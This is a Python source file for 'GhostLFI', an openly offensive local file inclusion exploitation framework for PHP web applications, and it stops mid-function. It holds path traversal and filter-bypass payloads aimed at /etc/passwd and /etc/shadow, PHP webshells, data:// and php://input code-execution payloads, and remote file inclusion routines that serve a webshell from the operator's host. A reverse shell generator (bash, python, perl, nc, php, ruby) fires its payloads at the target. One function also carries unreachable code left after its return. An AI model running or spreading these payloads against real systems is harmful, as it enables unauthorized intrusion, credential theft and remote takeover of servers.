#!/usr/bin/env python3
"""
GhostLFI - Local File Inclusion Exploitation Framework
Ghost Ops Security - The Ultimate All-In-One LFI Tool

Everything you need in ONE tool:
- Payload generation (LFI, wrappers, shells, revshells)
- Wrapper testing (expect://, data://, php://input)
- Advanced techniques (100% coverage)
- Bypass techniques (null byte, encoding, traversal)
- Log poisoning (Apache, Nginx)
- Session poisoning (PHP sessions)
- Interactive shell (with built-in generators)
- Reverse shell (automatic deployment with prompts)
- Auto-exploit (smart testing order)

For authorized penetration testing only.
"""

import argparse
import requests
import urllib.parse
import base64
import re
import sys
import time
import socket
import os
from typing import List, Dict, Tuple, Optional
from colorama import Fore, Style, init
import warnings
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

init(autoreset=True)


class UltimateLFIExploiter:
    """The only LFI tool you'll ever need - everything integrated"""
    
    def __init__(self, target_url: str, parameter: str, proxy: Optional[str] = None):
        self.target_url = target_url
        self.parameter = parameter
        self.session = requests.Session()
        self.session.verify = False
        self.proxy = {'http': proxy, 'https': proxy} if proxy else None
        self.rce_method = None
        self.config_status = {}
        self.successful_methods = []
        
        # LFI test paths
        self.lfi_paths = [
            '/etc/passwd',
            '/etc/shadow',
            '/etc/hosts',
            '/etc/issue',
            '/proc/self/environ',
            '/proc/self/cmdline',
            '/var/log/apache2/access.log',
            '/var/log/nginx/access.log',
            'C:\\Windows\\System32\\drivers\\etc\\hosts',
        ]
        
        # Webshells
        self.webshells = {
            'minimal': '<?php system($_GET["cmd"]); ?>',
            'request': '<?php system($_REQUEST["cmd"]); ?>',
            'post': '<?php system($_POST["cmd"]); ?>',
            'eval': '<?php eval($_REQUEST["cmd"]); ?>',
            'passthru': '<?php passthru($_GET["cmd"]); ?>',
        }
    
    def print_banner(self):
        """Display tool banner"""
        banner = f"""
{Fore.CYAN}
   ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗██╗     ███████╗██╗
  ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝██║     ██╔════╝██║
  ██║  ███╗███████║██║   ██║███████╗   ██║   ██║     █████╗  ██║
  ██║   ██║██╔══██║██║   ██║╚════██║   ██║   ██║     ██╔══╝  ██║
  ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   ███████╗██║     ██║
   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚═╝     ╚═╝
{Style.RESET_ALL}
{Fore.RED}        ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
       ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
       ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌ ▀▀▀▀█░█▀▀▀▀ 
       ▐░▌          ▐░▌       ▐░▌     ▐░▌     
       ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌     ▐░▌     
       ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌     ▐░▌     
        ▀▀▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀      ▐░▌     
                 ▐░▌▐░▌               ▐░▌     
        ▄▄▄▄▄▄▄▄▄█░▌▐░▌           ▄▄▄▄█░█▄▄▄▄ 
       ▐░░░░░░░░░░░▌▐░▌          ▐░░░░░░░░░░░▌
        ▀▀▀▀▀▀▀▀▀▀▀  ▀            ▀▀▀▀▀▀▀▀▀▀▀ {Style.RESET_ALL}

{Fore.WHITE}╔════════════════════════════════════════════════════════════════════╗
║                                                                    ║
║          {Fore.YELLOW}Local File Inclusion Exploitation Framework{Fore.WHITE}             ║
║                    {Fore.CYAN}Ghost Ops Security{Fore.WHITE}                              ║
║                                                                    ║
║  {Fore.GREEN}✓{Fore.WHITE} Payload Generation    {Fore.GREEN}✓{Fore.WHITE} Wrapper Testing    {Fore.GREEN}✓{Fore.WHITE} RCE           ║
║  {Fore.GREEN}✓{Fore.WHITE} Bypass Techniques     {Fore.GREEN}✓{Fore.WHITE} Log Poisoning      {Fore.GREEN}✓{Fore.WHITE} Shells        ║
║  {Fore.GREEN}✓{Fore.WHITE} Session Poisoning     {Fore.GREEN}✓{Fore.WHITE} Auto-Exploit       {Fore.GREEN}✓{Fore.WHITE} Advanced      ║
║                                                                    ║
╚════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}

{Fore.YELLOW}[*] Target URL: {Fore.WHITE}{self.target_url}{Style.RESET_ALL}
{Fore.YELLOW}[*] Parameter:  {Fore.WHITE}{self.parameter}{Style.RESET_ALL}
{Fore.YELLOW}[*] Version:    {Fore.WHITE}3.7 - URL Encoding Fixed (PHAR/ZIP Working){Style.RESET_ALL}
"""
        print(banner)

    # ==================== PAYLOAD GENERATION ====================
    
    def generate_lfi_payloads(self, target_file: str = '/etc/passwd', depth: int = 10) -> Dict[str, str]:
        """Generate various LFI bypass payloads - Advanced techniques + PayloadsAllTheThings"""
        payloads = {}
        
        # Basic traversal
        payloads['basic'] = '../' * depth + target_file
        
        # Null byte bypass (PHP < 5.3)
        payloads['null_byte'] = '../' * depth + target_file + '%00'
        payloads['null_byte_ext'] = '../' * depth + target_file + '%00.jpg'
        
        # Double encoding
        payloads['double_encode'] = ('..' + '%252f') * depth + target_file
        
        # Path truncation (PHP < 5.3)
        payloads['path_truncation'] = '../' * depth + target_file + '/' * 2048
        payloads['dot_truncation'] = '../' * depth + target_file + '/.' * 2048
        
        # URL encoding
        payloads['url_encoded'] = ('..' + '%2f') * depth + target_file
        
        # Double traversal
        payloads['double_traversal'] = ('..../' + '/') * depth + target_file
        payloads['double_dot_slash'] = '....//....//....//....//....//....//....//....//....//....//etc/passwd'
        
        # Backslash (Windows)
        payloads['backslash'] = ('..\\') * depth + target_file.replace('/', '\\')
        
        # Mixed encoding
        payloads['mixed_encoding'] = ('%2e%2e%2f') * depth + target_file
        
        # Absolute path
        payloads['absolute'] = '/' + target_file
        
        # PayloadsAllTheThings additions
        
        # UTF-8 encoding
        payloads['utf8_1'] = '..%c0%af' * depth + target_file
        payloads['utf8_2'] = '..%c1%9c' * depth + target_file
        
        # 16-bit Unicode encoding
        payloads['unicode_1'] = '..%u2216' * depth + target_file
        payloads['unicode_2'] = '..%u2215' * depth + target_file
        
        # Double URL encoding
        payloads['double_url'] = ('..' + '%252f') * depth + target_file
        
        # Bypass "../" filter
        payloads['bypass_filter_1'] = '..;/' * depth + target_file
        payloads['bypass_filter_2'] = '..%00/' * depth + target_file
        payloads['bypass_filter_3'] = '..%0d/' * depth + target_file
        payloads['bypass_filter_4'] = '..%0a/' * depth + target_file
        payloads['bypass_filter_5'] = '..%5c' * depth + target_file
        
        # Bypass "../" with slash
        payloads['slash_bypass_1'] = '.././' * depth + target_file
        payloads['slash_bypass_2'] = '....//' * depth + target_file
        
        # Windows specific
        if 'windows' in target_file.lower() or 'c:' in target_file.lower():
            payloads['windows_1'] = '..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts'
            payloads['windows_2'] = '....\\\\....\\\\....\\\\....\\\\windows\\system32\\drivers\\etc\\hosts'
        
        # PHP wrappers bypass
        payloads['filter_convert'] = f'php://filter/convert.base64-encode/resource={target_file}'
        payloads['filter_string'] = f'php://filter/string.rot13/resource={target_file}'
        payloads['filter_zlib'] = f'php://filter/zlib.deflate/resource={target_file}'
        
        # Zip wrapper
        payloads['zip_wrapper'] = f'zip://shell.zip%23shell.php'
        
        # Phar wrapper
        payloads['phar_wrapper'] = f'phar://shell.phar/shell.php'
        
        # Expect wrapper (if enabled)
        payloads['expect_id'] = 'expect://id'
        payloads['expect_whoami'] = 'expect://whoami'
        
        # Data wrapper
        payloads['data_base64'] = 'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+'
        payloads['data_plain'] = 'data://text/plain,<?php system($_GET["cmd"]); ?>'
        
        # Input wrapper
        payloads['php_input'] = 'php://input'
        
        # PayloadsAllTheThings - Filter chains
        payloads['filter_chain_1'] = 'php://filter/convert.iconv.UTF-8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF-8.UTF7|convert.base64-decode|convert.base64-encode|convert.iconv.UTF-8.UTF7|convert.base64-decode|convert.base64-encode|convert.iconv.UTF-8.UTF7|convert.base64-decode/resource=index.php'
        
        # Case variation (bypass case-sensitive filters)
        payloads['case_variation_1'] = '../' * depth + 'ETc/PASSwd'
        payloads['case_variation_2'] = '../' * depth + 'eTc/pAsSwD'
        
        return payloads
    
    def generate_wrapper_payloads(self, command: str = "id") -> Dict[str, any]:
        """Generate all PHP wrapper payloads"""
        payloads = {}
        
        # expect:// wrapper
        payloads['expect'] = f'expect://{urllib.parse.quote(command)}'
        
        # data:// wrapper - base64
        php_code = f'<?php system("{command}"); ?>'
        b64 = base64.b64encode(php_code.encode()).decode()
        payloads['data_base64'] = f'data://text/plain;base64,{b64}'
        
        # data:// wrapper - plain
        payloads['data_plain'] = f'data://text/plain,{urllib.parse.quote(php_code)}'
        
        # php://input (needs POST)
        payloads['php_input'] = {
            'url': 'php://input',
            'post_get': '<?php system($_GET["cmd"]); ?>',
            'post_request': '<?php system($_REQUEST["cmd"]); ?>',
            'post_direct': php_code
        }
        
        # php://filter
        payloads['filter_base64'] = 'php://filter/convert.base64-encode/resource='
        
        return payloads
    
    def generate_reverse_shells(self, lhost: str, lport: int = 4444) -> Dict[str, str]:
        """Generate various reverse shell payloads"""
        shells = {
            'bash_tcp': f'bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"',
            'bash_tcp_alt': f'/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
            'python': f'''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' ''',
            'python3': f'''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' ''',
            'perl': f'''perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};' ''',
            'nc': f'nc -e /bin/sh {lhost} {lport}',
            'nc_mkfifo': f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f',
            'php': f'''php -r '$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");' ''',
            'ruby': f'''ruby -rsocket -e'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' ''',
        }
        return shells
    
    def generate_reverse_shell(self):
        """Interactive reverse shell generator"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"[REVERSE SHELL GENERATOR]")
        print(f"{'='*60}{Style.RESET_ALL}")
        
        lhost = input(f"{Fore.YELLOW}Enter your IP (LHOST): {Style.RESET_ALL}").strip()
        lport = input(f"{Fore.YELLOW}Enter your port (LPORT) [4444]: {Style.RESET_ALL}").strip() or '4444'
        
        try:
            lport = int(lport)
        except:
            lport = 4444
        
        shells = self.generate_reverse_shells(lhost, lport)
        
        print(f"\n{Fore.GREEN}[✓] Generated reverse shell payloads:{Style.RESET_ALL}")
        print(f"\n{Fore.YELLOW}[*] Start listener first:{Style.RESET_ALL}")
        print(f"    nc -lvnp {lport}")
        
        print(f"\n{Fore.CYAN}Available shells:{Style.RESET_ALL}")
        for i, (name, cmd) in enumerate(shells.items(), 1):
            print(f"  {i}. {name}")
        
        choice = input(f"\n{Fore.YELLOW}Select shell [1-{len(shells)}]: {Style.RESET_ALL}").strip()
        
        try:
            choice = int(choice)
            if 1 <= choice <= len(shells):
                shell_name = list(shells.keys())[choice - 1]
                shell_cmd = shells[shell_name]
                
                print(f"\n{Fore.GREEN}[✓] Selected: {shell_name}{Style.RESET_ALL}")
                print(f"\n{Fore.CYAN}Execute this command on target:{Style.RESET_ALL}")
                print(f"{Fore.WHITE}{shell_cmd}{Style.RESET_ALL}")
                
                # Try to execute via RCE
                if hasattr(self, 'lfi_payload'):
                    print(f"\n{Fore.YELLOW}[*] Attempting to execute via RCE...{Style.RESET_ALL}")
                    full_url = f"{self.target_url}?{self.parameter}={self.lfi_payload}&cmd={urllib.parse.quote(shell_cmd)}"
                    print(f"{Fore.CYAN}[*] URL: {full_url}{Style.RESET_ALL}")
                    
                    try:
                        self.session.get(full_url, timeout=3, proxies=self.proxy)
                    except:
                        pass
                    
                    print(f"{Fore.GREEN}[✓] Payload sent! Check your listener.{Style.RESET_ALL}")
                
        except:
            print(f"{Fore.RED}[✗] Invalid selection{Style.RESET_ALL}")
    
    def encode_payload(self, payload: str) -> Dict[str, str]:
        """Encode payload in various formats"""
        encodings = {
            'original': payload,
            'url': urllib.parse.quote(payload),
            'double_url': urllib.parse.quote(urllib.parse.quote(payload)),
            'base64': base64.b64encode(payload.encode()).decode(),
            'hex': payload.encode().hex(),
        }
        return encodings

    # ==================== PHP CONFIG CHECK ====================
    
    def check_php_config(self) -> Dict[str, bool]:
        """Check PHP configuration - Advanced methodology"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"[PHASE 1] PHP Configuration Check")
        print(f"{'='*60}{Style.RESET_ALL}")
        
        config_status = {
            'allow_url_include': False,
            'allow_url_fopen': False,
            'expect_extension': False,
            'config_readable': False
        }
        
        php_versions = ['8.2', '8.1', '8.0', '7.4', '7.3', '7.2', '7.1', '7.0', '5.6']
        config_paths = []
        
        for version in php_versions:
            config_paths.extend([
                f'/etc/php/{version}/apache2/php.ini',
                f'/etc/php/{version}/fpm/php.ini',
                f'/etc/php/{version}/cli/php.ini',
            ])
        
        config_paths.extend([
            '/usr/local/lib/php.ini',
            '/etc/php.ini',
            'C:\\xampp\\php\\php.ini',
            'C:\\php\\php.ini',
        ])
        
        print(f"{Fore.YELLOW}[*] Attempting to read PHP configuration...{Style.RESET_ALL}")
        
        for config_path in config_paths:
            try:
                payload = f'php://filter/convert.base64-encode/resource={config_path}'
                response = self._send_payload(payload, timeout=5)
                
                base64_pattern = re.findall(r'([A-Za-z0-9+/]{100,}={0,2})', response.text)
                
                if base64_pattern:
                    for b64_string in base64_pattern:
                        try:
                            decoded = base64.b64decode(b64_string).decode('utf-8', errors='ignore')
                            
                            if 'allow_url_include' in decoded:
                                config_status['config_readable'] = True
                                
                                if re.search(r'allow_url_include\s*=\s*On', decoded, re.IGNORECASE):
                                    config_status['allow_url_include'] = True
                                    print(f"{Fore.GREEN}[✓] allow_url_include = On (data://, php://input, RFI enabled){Style.RESET_ALL}")
                                else:
                                    print(f"{Fore.RED}[✗] allow_url_include = Off (data://, php://input, RFI disabled){Style.RESET_ALL}")
                                
                                if re.search(r'allow_url_fopen\s*=\s*On', decoded, re.IGNORECASE):
                                    config_status['allow_url_fopen'] = True
                                    print(f"{Fore.GREEN}[✓] allow_url_fopen = On{Style.RESET_ALL}")
                                
                                if re.search(r'extension\s*=\s*expect', decoded):
                                    config_status['expect_extension'] = True
                                    print(f"{Fore.GREEN}[✓] expect extension enabled (expect:// available){Style.RESET_ALL}")
                                else:
                                    print(f"{Fore.YELLOW}[!] expect extension not found (expect:// unavailable){Style.RESET_ALL}")
                                
                                print(f"{Fore.CYAN}[+] Found config: {config_path}{Style.RESET_ALL}")
                                self.config_status = config_status
                                return config_status
                        except:
                            continue
            except:
                continue
        
        print(f"{Fore.YELLOW}[!] Could not read PHP configuration{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Will attempt all methods anyway...{Style.RESET_ALL}")
        self.config_status = config_status
        return config_status

    # ==================== LFI TESTING ====================
    
    def test_basic_lfi(self) -> bool:
        """Test for basic LFI vulnerability"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"[PHASE 2] LFI Vulnerability Test")
        print(f"{'='*60}{Style.RESET_ALL}")
        
        for path in self.lfi_paths[:3]:  # Test first 3
            try:
                response = self._send_payload(path)
                if 'root:' in response.text and ('bin:' in response.text or 'daemon:' in response.text):
                    print(f"{Fore.GREEN}[✓] LFI vulnerability confirmed!{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}    Successfully read: {path}{Style.RESET_ALL}")
                    return True
            except:
                continue
        
        # Try with traversal
        for depth in [4, 8, 12]:
            try:
                path = '../' * depth + 'etc/passwd'
                response = self._send_payload(path)
                if 'root:' in response.text:
                    print(f"{Fore.GREEN}[✓] LFI vulnerability confirmed!{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}    Successfully read: {path}{Style.RESET_ALL}")
                    return True
            except:
                continue
        
        print(f"{Fore.RED}[✗] Could not confirm LFI vulnerability{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Continuing with wrapper tests anyway...{Style.RESET_ALL}")
        return False
    
    def test_lfi_bypasses(self) -> Dict[str, bool]:
        """Test various LFI bypass techniques"""
        print(f"\n{Fore.CYAN}[ADVANCED] Testing LFI Bypass Techniques{Style.RESET_ALL}")
        results = {}
        
        bypasses = self.generate_lfi_payloads('/etc/passwd', 6)
        
        for name, payload in bypasses.items():
            try:
                response = self._send_payload(payload)
                if 'root:' in response.text and 'bin:' in response.text:
                    print(f"{Fore.GREEN}[✓] Bypass successful: {name}{Style.RESET_ALL}")
                    results[name] = True
                else:
                    results[name] = False
            except:
                results[name] = False
        
        return results

    # ==================== WRAPPER TESTING ====================
    
    def test_expect_wrapper(self) -> bool:
        """Test expect:// wrapper"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"[PHASE 3.1] Testing expect:// Wrapper")
        print(f"{'='*60}{Style.RESET_ALL}")
        
        if not self.config_status.get('expect_extension'):
            print(f"{Fore.YELLOW}[!] expect extension not detected in config{Style.RESET_ALL}")
        
        try:
            payload = 'expect://id'
            response = self._send_payload(payload)
            
            if 'uid=' in response.text and 'gid=' in response.text:
                print(f"{Fore.GREEN}[✓] expect:// wrapper RCE successful!{Style.RESET_ALL}")
                print(f"{Fore.GREEN}    Output: {response.text[:100]}...{Style.RESET_ALL}")
                self.rce_method = 'expect'
                self.successful_methods.append('expect://')
                return True
            else:
                print(f"{Fore.RED}[✗] expect:// wrapper not available{Style.RESET_ALL}")
                return False
        except Exception as e:
            print(f"{Fore.RED}[✗] expect:// test failed{Style.RESET_ALL}")
            return False
    
    def test_data_wrapper(self) -> bool:
        """Test data:// wrapper"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"[PHASE 3.2] Testing data:// Wrapper")
        print(f"{'='*60}{Style.RESET_ALL}")
        
        if not self.config_status.get('allow_url_include'):
            print(f"{Fore.YELLOW}[!] allow_url_include not enabled (required for data://){Style.RESET_ALL}")
        
        # Method 1: Base64
        print(f"{Fore.YELLOW}[*] Testing data:// with base64 encoding...{Style.RESET_ALL}")
        try:
            php_code = '<?php system("id"); ?>'
            b64_encoded = base64.b64encode(php_code.encode()).decode()
            payload = f'data://text/plain;base64,{b64_encoded}'
            
            response = self._send_payload(payload)
            
            if 'uid=' in response.text and 'gid=' in response.text:
                print(f"{Fore.GREEN}[✓] data:// wrapper (base64) RCE successful!{Style.RESET_ALL}")
                print(f"{Fore.GREEN}    Output: {response.text[:100]}...{Style.RESET_ALL}")
                self.rce_method = 'data_base64'
                self.successful_methods.append('data://base64')
                return True
        except:
            pass
        
        # Method 2: Plain text
        print(f"{Fore.YELLOW}[*] Testing data:// with plain text...{Style.RESET_ALL}")
        try:
            php_code = urllib.parse.quote('<?php system("id"); ?>')
            payload = f'data://text/plain,{php_code}'
            
            response = self._send_payload(payload)
            
            if 'uid=' in response.text and 'gid=' in response.text:
                print(f"{Fore.GREEN}[✓] data:// wrapper (plain) RCE successful!{Style.RESET_ALL}")
                self.rce_method = 'data_plain'
                self.successful_methods.append('data://plain')
                return True
        except:
            pass
        
        print(f"{Fore.RED}[✗] data:// wrapper not working{Style.RESET_ALL}")
        return False
    
    def test_php_input_wrapper(self) -> bool:
        """Test php://input wrapper"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"[PHASE 3.3] Testing php://input Wrapper")
        print(f"{'='*60}{Style.RESET_ALL}")
        
        if not self.config_status.get('allow_url_include'):
            print(f"{Fore.YELLOW}[!] allow_url_include not enabled (required for php://input){Style.RESET_ALL}")
        
        payload = 'php://input'
        
        # Method 1: $_GET
        print(f"{Fore.YELLOW}[*] Testing php://input with \\$_GET...{Style.RESET_ALL}")
        try:
            php_code = '<?php system($_GET["cmd"]); ?>'
            response = self._send_payload(payload + '&cmd=id', method='POST', data=php_code)
            
            if 'uid=' in response.text and 'gid=' in response.text:
                print(f"{Fore.GREEN}[✓] php://input with \\$_GET RCE successful!{Style.RESET_ALL}")
                self.rce_method = 'php_input_get'
                self.successful_methods.append('php://input($_GET)')
                return True
        except:
            pass
        
        # Method 2: $_REQUEST
        print(f"{Fore.YELLOW}[*] Testing php://input with \\$_REQUEST...{Style.RESET_ALL}")
        try:
            php_code = '<?php system($_REQUEST["cmd"]); ?>'
            response = self._send_payload(payload + '&cmd=id', method='POST', data=php_code)
            
            if 'uid=' in response.text and 'gid=' in response.text:
                print(f"{Fore.GREEN}[✓] php://input with \\$_REQUEST RCE successful!{Style.RESET_ALL}")
                self.rce_method = 'php_input_request'
                self.successful_methods.append('php://input($_REQUEST)')
                return True
        except:
            pass
        
        # Method 3: Direct
        print(f"{Fore.YELLOW}[*] Testing php://input with direct execution...{Style.RESET_ALL}")
        try:
            php_code = '<?php system("id"); ?>'
            response = self._send_payload(payload, method='POST', data=php_code)
            
            if 'uid=' in response.text and 'gid=' in response.text:
                print(f"{Fore.GREEN}[✓] php://input direct execution RCE successful!{Style.RESET_ALL}")
                self.rce_method = 'php_input_direct'
                self.successful_methods.append('php://input(direct)')
                return True
        except:
            pass
        
        print(f"{Fore.RED}[✗] php://input wrapper not working{Style.RESET_ALL}")
        return False

    # ==================== RFI TESTING ====================
    
    def test_rfi_vulnerability(self) -> bool:
        """Test for Remote File Inclusion (RFI) vulnerability"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"[PHASE 3.4] Testing RFI (Remote File Inclusion)")
        print(f"{'='*60}{Style.RESET_ALL}")
        
        if not self.config_status.get('allow_url_include'):
            print(f"{Fore.YELLOW}[!] allow_url_include not enabled (required for RFI){Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Testing anyway (may work with SMB on Windows)...{Style.RESET_ALL}")
        
        # Test 1: Include local URL (SSRF test)
        print(f"{Fore.YELLOW}[*] Testing RFI with local URL (SSRF)...{Style.RESET_ALL}")
        try:
            payload = 'http://127.0.0.1:80/index.php'
            response = self._send_payload(payload, timeout=5)
            
            # Check if we got content (not just error)
            if len(response.text) > 100 and response.status_code == 200:
                print(f"{Fore.GREEN}[✓] RFI vulnerability confirmed!{Style.RESET_ALL}")
                print(f"{Fore.GREEN}    Can include remote URLs (SSRF possible){Style.RESET_ALL}")
                self.successful_methods.append('RFI/SSRF')
                return True
        except:
            pass
        
        print(f"{Fore.YELLOW}[!] Could not confirm RFI with local URL{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] RFI may still work with hosted files...{Style.RESET_ALL}")
        return False
    
    def test_rfi_http(self, lhost: str, lport: int = 8000) -> bool:
        """Test RFI with HTTP protocol"""
        print(f"\n{Fore.CYAN}[RFI-HTTP] Testing HTTP-based RFI{Style.RESET_ALL}")
        
        # Create shell file
        shell_content = '<?php system($_GET["cmd"]); ?>'
        shell_path = '/tmp/ghostlfi_shell.php'
        
        try:
            with open(shell_path, 'w') as f:
                f.write(shell_content)
            
            print(f"{Fore.YELLOW}[*] Created shell at: {shell_path}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Start HTTP server: sudo python3 -m http.server {lport}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Then include: http://{lhost}:{lport}/ghostlfi_shell.php&cmd=id{Style.RESET_ALL}")
            
            # Generate payload
            payload = f'http://{lhost}:{lport}/ghostlfi_shell.php'
            
            print(f"{Fore.CYAN}[+] RFI HTTP Payload: {payload}&cmd=id{Style.RESET_ALL}")
            return True
            
        except Exception as e:
            print(f"{Fore.RED}[✗] Failed to prepare HTTP RFI: {str(e)}{Style.RESET_ALL}")
            return False
    
    def test_rfi_ftp(self, lhost: str, lport: int = 21) -> bool:
        """Test RFI with FTP protocol"""
        print(f"\n{Fore.CYAN}[RFI-FTP] Testing FTP-based RFI{Style.RESET_ALL}")
        
        print(f"{Fore.YELLOW}[*] FTP may bypass HTTP restrictions{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Start FTP server: sudo python -m pyftpdlib -p {lport}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Place shell.php in current directory{Style.RESET_ALL}")
        
        # Generate payload
        payload = f'ftp://{lhost}:{lport}/ghostlfi_shell.php'
        
        print(f"{Fore.CYAN}[+] RFI FTP Payload: {payload}&cmd=id{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[+] With auth: ftp://user:pass@{lhost}:{lport}/ghostlfi_shell.php&cmd=id{Style.RESET_ALL}")
        
        return True
    
    def exploit_rfi_auto(self, lhost: str, protocol: str = 'http', lport: int = None) -> bool:
        """Automatically exploit RFI if possible"""
        print(f"\n{Fore.CYAN}[RFI AUTO-EXPLOIT] Attempting automatic RFI exploitation{Style.RESET_ALL}")
        
        # Set default port
        if not lport:
            if protocol == 'http':
                lport = 8000
            elif protocol == 'ftp':
                lport = 21
        
        # Create shell
        shell_content = '<?php system($_GET["cmd"]); ?>'
        shell_path = '/tmp/ghostlfi_shell.php'
        
        try:
            with open(shell_path, 'w') as f:
                f.write(shell_content)
            print(f"{Fore.GREEN}[✓] Created shell: {shell_path}{Style.RESET_ALL}")
        except:
            print(f"{Fore.RED}[✗] Could not create shell{Style.RESET_ALL}")
            return False
        
        # Construct RFI payload
        from urllib.parse import urlparse
        parsed = urlparse(self.target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        if protocol == 'http':
            rfi_payload = f'http://{lhost}:{lport}/ghostlfi_shell.php'
        elif protocol == 'ftp':
            rfi_payload = f'ftp://{lhost}:{lport}/ghostlfi_shell.php'
        elif protocol == 'smb':
            rfi_payload = f'\\\\{lhost}\\share\\ghostlfi_shell.php'
        else:
            print(f"{Fore.RED}[✗] Unknown protocol{Style.RESET_ALL}")
            return False
        
        print(f"{Fore.YELLOW}[*] Testing RFI with {protocol.upper()}...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Make sure your server is running!{Style.RESET_ALL}")
        
        # Test command execution
        try:
            full_url = f'{base_url}?{self.parameter}={urllib.parse.quote(rfi_payload)}&cmd=id'
            print(f"{Fore.CYAN}[*] Testing: {full_url}{Style.RESET_ALL}")
            
            response = self.session.get(full_url, proxies=self.proxy, timeout=10)
            
            if 'uid=' in response.text and 'gid=' in response.text:
                print(f"{Fore.GREEN}[✓] RFI exploitation successful!{Style.RESET_ALL}")
                print(f"{Fore.GREEN}    Output: {response.text[:200]}...{Style.RESET_ALL}")
                self.rce_method = f'rfi_{protocol}'
                self.successful_methods.append(f'RFI-{protocol.upper()}')
                return True
            else:
                print(f"{Fore.YELLOW}[!] Command might have executed but output not visible{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[!] Check your server logs{Style.RESET_ALL}")
                return False
                
        except Exception as e:
            print(f"{Fore.RED}[✗] RFI test failed: {str(e)}{Style.RESET_ALL}")
            return False
        """Test RFI with SMB protocol (Windows targets)"""
        print(f"\n{Fore.CYAN}[RFI-SMB] Testing SMB-based RFI (Windows){Style.RESET_ALL}")
        
        print(f"{Fore.YELLOW}[*] SMB works on Windows without allow_url_include!{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Start SMB server: impacket-smbserver -smb2support share $(pwd){Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Place shell.php in current directory{Style.RESET_ALL}")
        
        # Generate UNC path payloads
        payload = f'\\\\{lhost}\\share\\ghostlfi_shell.php'
        
        print(f"{Fore.CYAN}[+] RFI SMB Payload (UNC): {payload}&cmd=whoami{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[!] Note: SMB works best on same network{Style.RESET_ALL}")
        
        return True
    
    def setup_rfi_server(self, protocol: str = 'http', lhost: str = None, lport: int = None) -> bool:
        """Setup RFI server and provide instructions"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"[RFI SETUP] Remote File Inclusion Server Setup")
        print(f"{'='*60}{Style.RESET_ALL}")
        
        if not lhost:
            lhost = input(f"{Fore.YELLOW}Enter your IP address: {Style.RESET_ALL}")
        
        # Create malicious shell
        shell_content = '<?php system($_GET["cmd"]); ?>'
        shell_path = '/tmp/ghostlfi_shell.php'
        
        try:
            with open(shell_path, 'w') as f:
                f.write(shell_content)
            print(f"{Fore.GREEN}[✓] Created shell: {shell_path}{Style.RESET_ALL}")
        except:
            print(f"{Fore.RED}[✗] Could not create shell file{Style.RESET_ALL}")
        
        # Parse target URL - extract base without query params
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(self.target_url)
        # Get base URL without any query parameters
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        if protocol == 'http':
            if not lport:
                lport = 8000
            print(f"\n{Fore.YELLOW}[STEP 1] Start HTTP Server:{Style.RESET_ALL}")
